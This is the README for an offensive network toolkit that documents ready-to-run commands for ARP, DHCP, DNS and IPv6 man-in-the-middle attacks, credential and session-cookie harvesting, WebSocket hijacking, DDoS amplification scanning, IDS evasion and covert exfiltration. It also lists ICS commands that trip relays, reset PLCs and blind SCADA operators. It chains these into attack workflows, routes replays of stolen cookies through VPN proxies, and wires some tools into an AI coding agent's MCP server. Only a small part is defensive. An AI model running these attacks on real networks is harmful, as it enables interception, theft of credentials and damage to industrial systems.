# ClaudeCodeIPTool v6.0

Packet-level network attack primitives for controlled-environment security research. 16 tools covering Layer 2/3/IPv6/ICS MITM, service discovery poisoning, WebSocket hijacking, IDS/IPS evasion, and credential capture.

---

## Tools

### Reconnaissance

#### 1. `lan-discovery.py` - Automated Network Reconnaissance
Discover and profile attack targets before exploitation:
- ARP scan for live host discovery
- Port scanning on common services
- OS fingerprinting via TTL analysis
- Attack target suggestions with tool recommendations

```bash
sudo python3 lan-discovery.py --suggest
sudo python3 lan-discovery.py --full --output lan-hosts.json
```

**Status**: ✓ Functional

---

### Offensive - Layer 3 (Internet-Wide)

#### 2. `spoofer.py` - Core IP Spoofing Primitives
One-way spoofing demonstrations (no responses received):
- TCP SYN flood with forged source IP
- UDP amplification (reflection attacks)
- ICMP redirect spoofing
- Decoy scanning (Nmap -D style)
- TTL manipulation for detection evasion

```bash
sudo python3 spoofer.py demo 192.168.1.1
```

**Status**: ✓ Functional (requires root/sudo)

#### 3. `spoof-scanner.py` - Reflection/Amplification Reconnaissance
Identify DDoS amplification vectors:
- Scans 8 reflection services (DNS, NTP, SNMP, Memcached, CharGen, SSDP, LDAP, HTTP)
- Reports amplification factors (Memcached 51,000x, NTP 556x, CharGen 358x)
- Tests BCP 38 / uRPF anti-spoofing controls
- JSON export

```bash
sudo python3 spoof-scanner.py scan --targets 8.8.8.8 --spoof 1.1.1.1
sudo python3 spoof-scanner.py test-bcp38 192.168.1.1 --victim 8.8.8.8
```

**Status**: ✓ Functional (tested against controlled targets)

#### 4. `ghostport.py` - Stealth Port Scanner via Spoofing
Port scanning without your IP touching the target:
- 4 inference methods: passive sniffing, timing side-channel, TTL differential, covert channels
- Target logs show victim IP, not attacker
- Attribution evasion demonstration

```bash
sudo python3 ghostport.py scan 192.168.1.100 --victim 8.8.8.8 --ports 80,443,22 --method passive
```

**Status**: ✓ Functional (requires 3-host setup or sniffing capability)

---

### Offensive - Layer 2/3 MITM (LAN)

#### 5. `dhcp-spoof.py` - DHCP 4-Way Handshake Spoofing
Rogue DHCP server implementing RFC 2131 - redirect routing/DNS at network config layer:
- Complete DISCOVER → OFFER → REQUEST → ACK handshake
- **Gateway mode**: become default route, intercept all traffic
- **DNS mode**: poison DNS only, keep real gateway
- **Isolate mode**: provide invalid gateway (DoS)

```bash
# Full MITM via gateway redirection
sudo python3 dhcp-spoof.py --mode gateway -v

# DNS poisoning only
sudo python3 dhcp-spoof.py --mode dns

# Network isolation DoS
sudo python3 dhcp-spoof.py --mode isolate
```

**Status**: ✓ Functional (requires root/sudo)

**RFC 2131 Options used:**
- Option 3 (router): Gateway redirection
- Option 6 (name_server): DNS poisoning
- Option 51 (lease_time): Attack persistence
- Options 58/59 (T1=T/2, T2=7T/8): Renewal timing

#### 6. `arp-spoof.py` - ARP Cache Poisoning (Layer 2)
True bidirectional spoofing via ARP cache manipulation:
- Standard ARP poisoning (op=2 reply)
- Gratuitous ARP for 3x faster cache updates (psrc=pdst broadcast)
- Bidirectional mode: poison both target and gateway simultaneously
- MITM traffic interception mode
- Auto IP forwarding enable/disable + clean restore on exit

```bash
# Basic ARP spoofing
sudo python3 arp-spoof.py spoof 192.168.1.100 --spoof-ip 192.168.1.1

# With traffic interception
sudo python3 arp-spoof.py spoof 192.168.1.100 --spoof-ip 192.168.1.1 --intercept

# Restore ARP cache
sudo python3 arp-spoof.py restore 192.168.1.100 --spoof-ip 192.168.1.1
```

**Status**: ✓ Functional (requires Layer 2 adjacency)

#### 7. `dns-spoof.py` - DNS Response Injection
Intercept DNS queries and return forged responses:
- Transaction ID matching (prevents rejected responses)
- Redirect specific domains or wildcard all traffic
- Real-time DNS injection

```bash
sudo python3 dns-spoof.py --domain bank.com --ip 192.168.1.50
sudo python3 dns-spoof.py --domain "*" --ip 192.168.1.50
```

**Status**: ✓ Functional (most effective with ARP spoofing active)

#### 8. `mitm-suite.py` - Credential Capture & Session Hijacking
Harvest traffic intercepted via ARP/DHCP spoofing:
- HTTP Basic Auth credential extraction
- POST form login data capture
- Session cookie hijacking
- SSL strip opportunity detection

```bash
sudo python3 mitm-suite.py -v
```

**Status**: ✓ Functional (requires ARP or DHCP spoofing active)

---

#### 9. `ws-hijack.py` - WebSocket Session Hijacking
WebSocket attack primitives: CSWSH, frame injection, Origin spoofing, covert channel:
- **CSWSH**: Cross-Site WebSocket Hijacking (no CORS on WS, browser auto-sends cookies on upgrade GET)
- **Frame injection**: Raw socket WS connect + masked frame construction (opcode/RSV/FIN control)
- **Covert channel**: RSV1 bit set = data invisible to DLP/IDS string matching
- **Forge 101**: Generate valid Sec-WebSocket-Accept token for MITM handshake positioning

```bash
# CSWSH probe: does server validate Origin?
python3 ws-hijack.py cswsh ws://target.com/ws --origin http://evil.com --cookies session=abc

# Inject frame into existing WS connection
python3 ws-hijack.py inject ws://target.com/ws --payload '{"action":"admin"}'

# Generate Sec-WebSocket-Accept for MITM
python3 ws-hijack.py forge --key dGhlIHNhbXBsZSBub25jZQ==
```

**Status**: ✓ Functional (no additional dependencies)

**Key mechanism**: `SHA1(key + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11") → base64` is the entire WebSocket handshake auth. Client-to-server frames are masked; server-to-client unmasked.

---

#### 10. `mdns-poison.py` - Multicast Service Discovery Poisoning
Poison three IoT/LAN service discovery protocols simultaneously:
- **mDNS** (224.0.0.251:5353): Apple AirPrint, Chromecast, IoT device discovery → forge PTR/SRV/A
- **WS-Discovery** (239.255.255.250:3702): ONVIF IP cameras, network printers → fake ProbeMatch SOAP
- **SSDP/UPnP** (239.255.255.250:1900): Smart TVs, routers, IoT → fake Internet Gateway Device

```bash
# Poison all mDNS service queries → attacker
sudo python3 mdns-poison.py mdns --attacker-ip 192.168.1.50 -v

# Pose as Hikvision IP camera for credential capture
sudo python3 mdns-poison.py wsd --attacker-ip 192.168.1.50 --device-name Hikvision-DS-2CD

# Broadcast fake UPnP IGD (router) for AddPortMapping abuse
sudo python3 mdns-poison.py ssdp --attacker-ip 192.168.1.50 --port 8080

# All three simultaneously
sudo python3 mdns-poison.py all --attacker-ip 192.168.1.50 -v
```

**Status**: ✓ Functional (optional: `pip install dnslib` for full mDNS record types)

---

#### 11. `ndp-spoof.py` - IPv6 NDP Poisoning + Rogue Router Advertisement
IPv6 Neighbor Discovery Protocol attacks (IPv6 equivalent of ARP/DHCP spoofing):
- **Rogue RA**: Become default IPv6 router via ICMPv6 type 134 → SLAAC clients auto-configure
- **M=1 RA**: Force DHCPv6 stateful addressing → steer clients to rogue DHCPv6 server
- **NA cache poison**: ICMPv6 type 136 O=1 → override neighbor cache (IPv6 ARP spoofing)
- **Bidirectional NDP**: Poison both victim→gateway and gateway→victim simultaneously
- **DAD DoS**: Intercept all Duplicate Address Detection NS, deny any address assignment

```bash
# Become IPv6 default router (SLAAC poisoning)
sudo python3 ndp-spoof.py rogue-ra eth0 --prefix 2001:db8:evil:: --len 64 -v

# Force DHCPv6 mode (M=1 O=1)
sudo python3 ndp-spoof.py rogue-ra eth0 --mode dhcpv6 --lifetime 1800

# Remove all default IPv6 routes (DoS)
sudo python3 ndp-spoof.py rogue-ra eth0 --mode dos

# Neighbor cache poisoning (IPv6 ARP spoof)
sudo python3 ndp-spoof.py ndp-poison eth0 2001:db8::victim --gateway fe80::1

# Deny all new IPv6 address assignments
sudo python3 ndp-spoof.py dad-dos eth0

# Full MITM: RA + bidirectional NDP
sudo python3 ndp-spoof.py mitm eth0 --prefix fd00:evil:: --victim 2001:db8::100 --gateway fe80::1
```

**Status**: ✓ Functional (requires root/sudo + Scapy)

**CRITICAL detail**: `hlim=255` required on all NDP packets (types 133-137) — most stacks silently drop anything else.

---

#### 12. `ics-probe.py` - ICS/OT Protocol Scanner and Packet Injector
Industrial Control System protocol probe covering all 5 major ICS protocols:
- **Modbus/TCP** (502): FC 01-16 read/write, FC 08 sub-4 listen-only DoS, FC 43 device ID enum
- **DNP3** (20000): FC 0x18 disable unsolicited (operator blind), FC 0x05 direct operate (relay trip), FC 0x12 cold restart
- **EtherNet/IP CIP** (44818/tcp + 2222/udp): CIP Reset (cold restart), Stop PLC (major fault), identity enum, UDP flood
- **BACnet/IP** (47808/udp): Who-Is broadcast discovery, fake COV sensor injection
- **OPC-UA** (4840): Hello probe, anonymous browse (SecurityMode=None detection)

```bash
# Multi-protocol scan (all 5 protocols)
python3 ics-probe.py scan 192.168.1.100 -v

# Modbus: read registers and coils
python3 ics-probe.py modbus 192.168.1.100 enum

# Modbus: flip relay coil 0 ON
python3 ics-probe.py modbus 192.168.1.100 write-coil --unit 1 --addr 0 --value on

# DNP3: blind SCADA operator (disable alarm reporting)
python3 ics-probe.py dnp3 192.168.1.100 disable-unsolicited

# DNP3: direct relay trip
python3 ics-probe.py dnp3 192.168.1.100 operate --point 0 --value on

# EtherNet/IP: enumerate Rockwell PLC identity
python3 ics-probe.py enip 192.168.1.100 enum

# EtherNet/IP: CIP Reset (cold restart - no auth)
python3 ics-probe.py enip 192.168.1.100 reset

# BACnet: Who-Is discovery broadcast
python3 ics-probe.py bacnet 255.255.255.255 scan

# BACnet: inject false temperature reading (150°F)
python3 ics-probe.py bacnet 192.168.1.100 spoof-cov --device 1234 --type 0 --instance 0 --value 150.0
```

**Status**: ✓ Functional (optional: `pip install opcua` for OPC-UA browse)

**Key finding from Project Basecamp (Digital Bond 2012)**: All ICS protocols above have no application-layer auth. CIP Reset requires only a registered session - no credentials.

---

#### 13. `evasion.py` - IDS/IPS Detection Evasion Module
Ptacek-Newsham (1998) insertion/evasion primitives — importable by other tools or run standalone:

- **Fragment overlap** (Ptacek-Newsham): overlapping IP fragments; IDS sees benign decoy, target reassembles real payload
- **TTL ghost insertion**: interleave ghost packets (TTL expires before target) to split IDS signatures across dead bytes
- **Tiny fragment flood**: 8-byte fragments exhaust IDS reassembly buffer/timeout
- **TCP SYN+payload**: 4B data in SYN bypasses post-handshake IDS signature engines
- **Lone ACK**: ACK with no prior SYN bypasses stateless firewall `--state ESTABLISHED` rules
- **Bad checksum decoy**: invalid TCP checksum drops at target but IDS without validation processes it
- **ICMP covert channel**: Loki-style type-0 echo reply carrier; XOR-encode data in OS-mimicking payloads
- **DNS evasion**: case variation, RFC 1035 compression pointers, random subdomain prefixes, DNS covert channel
- **ARP jitter**: randomized 15-45s ARP poison interval stays below Snort arp-spoof threshold (5/10s)
- **Rate profiles**: `paranoid` (5/hr), `silent` (5/min), `slow` (30/min), `normal` (2/sec), `aggressive` (10/sec)

```bash
# List all rate profiles and IDS thresholds
python3 evasion.py profiles

# Overlapping fragment evasion (Ptacek-Newsham)
sudo python3 evasion.py frag-overlap --src 10.0.0.1 --dst 10.0.0.2 --payload "GET / HTTP/1.1"

# SYN+payload: bypass post-handshake IDS signature engines
sudo python3 evasion.py syn-payload --dst 10.0.0.2 --dport 80 --payload "ATTACK"

# Lone ACK: stateless firewall bypass
sudo python3 evasion.py lone-ack --dst 10.0.0.2 --dport 443

# ICMP covert channel (Loki-style)
sudo python3 evasion.py icmp-covert --src 10.0.0.1 --dst 10.0.0.2 --data "exfil payload"

# Jittered ARP poison (evades Snort arp-spoof preprocessor threshold)
sudo python3 evasion.py arp-jitter --target 192.168.1.100 --spoof 192.168.1.1 \
     --our-mac de:ad:be:ef:00:01 --target-mac aa:bb:cc:dd:ee:ff

# Rate test: measure actual pps at chosen profile
sudo python3 evasion.py rate-test --dst 10.0.0.2 --count 20 --profile silent
```

**Module import** (retrofit other tools):
```python
from evasion import EvasionConfig
ev = EvasionConfig(profile="slow", ip_id_random=True, ttl_ghost=False)
ev.send(IP(dst=target)/TCP(dport=80))  # rate-limited + ID-randomized
```

**Status**: ✓ Functional (requires Scapy for all packet modes)

**Ptacek-Newsham model (1998)**: IDS and target reconstruct byte streams differently. *Insertion*: packets the IDS accepts but target ignores (bad TTL, bad checksum). *Evasion*: packets the target accepts but IDS drops (overlapping fragments, tiny frags). Both techniques split signatures across the anomalous bytes.

---

### Defensive

#### 14. `defense-detector.py` - Spoofing Attack Detection
Detect ARP/DNS attacks on your own network:
- ARP spoof detection (MAC change monitoring per IP)
- DNS spoof detection (response IP inconsistency tracking)
- Attacker MAC identification for blocking

```bash
sudo python3 defense-detector.py arp -v
sudo python3 defense-detector.py dns -v
```

**Status**: ✓ Functional

---

### Session Routing

#### 15. `session_replay.py` - Cookie Session Replay with Chrome TLS Impersonation
Replay captured browser sessions with proper TLS fingerprinting:
- `curl_cffi` mimics Chrome's exact JA3/JA3s/ALPN fingerprint
- Reads Netscape-format cookie files
- Bypasses TLS fingerprint detection (Google, Cloudflare, etc.)
- Modes: `probe`, `enumerate`, `export`

```bash
pip install curl_cffi
python3 session_replay.py probe --cookies cookies.txt --url https://admin.example.com/
python3 session_replay.py enumerate --cookies cookies.txt --domains targets.txt --output results.json
python3 session_replay.py test-tls --url https://tls.browserleaks.com/tls
```

**Status**: ✓ Functional (requires `pip install curl_cffi`)

#### 16. `windscribe_socks.py` - SOCKS5 Proxy + Chrome TLS Chain
Channel sessions through VPN exit IPs:
- Routes `curl_cffi` sessions through Windscribe SOCKS5 (localhost:1080)
- Shows exit IP and ASN before/after for routing confirmation
- Full chain: proxy + TLS impersonation + session cookies

```bash
python3 windscribe_socks.py status
python3 windscribe_socks.py chain --cookies cookies.txt --url https://admin.example.com/ --output result.html
python3 windscribe_socks.py probe https://ipinfo.io/json
```

**Status**: ✓ Functional (requires Windscribe connected + `pip install curl_cffi`)

---

## Setup

```bash
pip install scapy curl_cffi
python3 -c "from scapy.all import *; print('Scapy OK')"
```

---

## Attack Chains

### Chain 1: DHCP MITM (Stealthy, Network-Wide)

```bash
# Terminal 1: Start rogue DHCP server
sudo python3 dhcp-spoof.py --mode gateway -v

# Wait for target DHCP renewal (or force: sudo dhclient -r && sudo dhclient)
# Target now routes all traffic through you

# Terminal 2: Capture credentials
sudo python3 mitm-suite.py -v
```

Best for: new clients joining the network, no continuous poisoning needed.

### Chain 2: ARP MITM (Immediate, Per-Target)

```bash
# Terminal 1: Discover targets
sudo python3 lan-discovery.py --suggest

# Terminal 2: ARP poison (target ↔ gateway)
sudo python3 arp-spoof.py spoof 192.168.1.100 --spoof-ip 192.168.1.1 --intercept

# Terminal 3: DNS redirect (optional)
sudo python3 dns-spoof.py --domain bank.com --ip 192.168.1.50

# Terminal 4: Capture credentials
sudo python3 mitm-suite.py -v
```

Best for: immediate interception of existing sessions.

### Chain 3: DHCP + DNS (Dual-Layer Poisoning)

```bash
# Rogue DHCP pushes attacker DNS (Option 6)
sudo python3 dhcp-spoof.py --mode dns -v

# Once client renews, their DNS points to you
# All DNS queries now come to your machine
sudo python3 dns-spoof.py --domain "*" --ip 192.168.1.50
```

---

## Capability Matrix

| Tool | Attack Type | Scope | Protocol Layer | Requires LAN |
|------|------------|-------|----------------|--------------|
| spoofer.py | L3 one-way | Internet | IPv4 | No |
| spoof-scanner.py | Reflection scan | Internet | IPv4/UDP | No |
| ghostport.py | Attribution evasion | Internet | TCP | No |
| dhcp-spoof.py | Network config hijack | Subnet | IPv4 DHCP | Yes |
| arp-spoof.py | L2 bidirectional MITM | LAN | L2/ARP | Yes |
| dns-spoof.py | DNS injection | LAN | DNS/UDP | Yes |
| mitm-suite.py | Credential capture | LAN | L7 HTTP | Yes |
| ws-hijack.py | Session hijack | Any | WebSocket | No |
| mdns-poison.py | Service discovery | LAN | mDNS/WSD/SSDP | Yes |
| ndp-spoof.py | L2+L3 IPv6 MITM | LAN | IPv6/NDP | Yes |
| ics-probe.py | ICS/OT control | LAN/OT | Modbus/DNP3/CIP | Yes |
| evasion.py | IDS/IPS evasion | Any | IP/TCP/ICMP/DNS | No |

---

## Requirements

**Raw socket access** (root/sudo required for all MITM/spoofing tools)

**BCP 38 / uRPF status** affects Layer 3 one-way spoofing:
- Cloud providers (AWS, GCP, Azure): block spoofed packets
- Dedicated servers (Hetzner, OVH): typically allow
- Home ISPs: typically allow (test on owned infrastructure only)

**DHCP and ARP tools** are not affected by BCP 38 (operate at L2).

---

## Defensive Hardening

**Against DHCP spoofing:** Enable DHCP snooping on managed switches; use static IPs.

**Against ARP spoofing:** Dynamic ARP Inspection (DAI); static ARP entries for gateways.

**Against DNS spoofing:** DNSSEC; encrypted DNS (DoH/DoT).

**Against IP spoofing (BCP 38):**
```bash
# Cisco - uRPF strict mode
interface GigabitEthernet0/0
 ip verify unicast source reachable-via rx

# Linux iptables
iptables -t raw -A PREROUTING -m rpfilter --invert -j DROP
```

**Detection via TTL analysis:**
```python
# See spoofer.py SpoofDetector class
detector = SpoofDetector(threshold=5)
detector.analyze(src_ip='8.8.8.8', observed_ttl=13)
```

---

## MCP Integration

Natural language interface via Claude Code MCP server:

```bash
# Configured at ~/.claude/mcp-servers/ClaudeCodeIPTool/server.py
# Available tools:
# - spoof_reflection_scan
# - spoof_ghostport_scan
# - spoof_test_bcp38
# - spoof_detect_ttl
# - spoof_list_services
```
